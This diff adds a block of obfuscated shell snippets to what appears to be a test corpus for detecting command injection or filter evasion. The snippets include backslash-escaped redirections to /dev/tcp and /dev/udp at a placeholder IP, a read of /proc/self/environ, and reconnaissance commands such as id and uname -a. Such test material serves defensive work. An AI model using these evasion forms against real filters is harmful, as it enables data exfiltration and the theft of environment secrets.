@@ -732,3 +732,22 @@ ls foo
 ls>index.txt
 jobs -x ls
 "jobs" -\x ls
+
+# snippets
+/bin/cat foo
+/bin/more
+/bin/uname -a
+< /dev/fd/1
+< /dev/null
+foo /dev/stder\r
+foo < /dev/stdin
+foo /dev/stdo\ut
+blah > /dev\/tcp/1.2.3.4/80
+blah > /dev/ud\p/1.2.3.4/80
+foo /dev/zero
+/usr/bin/id
+/usr/bin/le\ss
+/usr/bin/m\ore
+/usr/bin/nic\e
+/usr/bin/uname -a
+foo /proc/self/env\iron
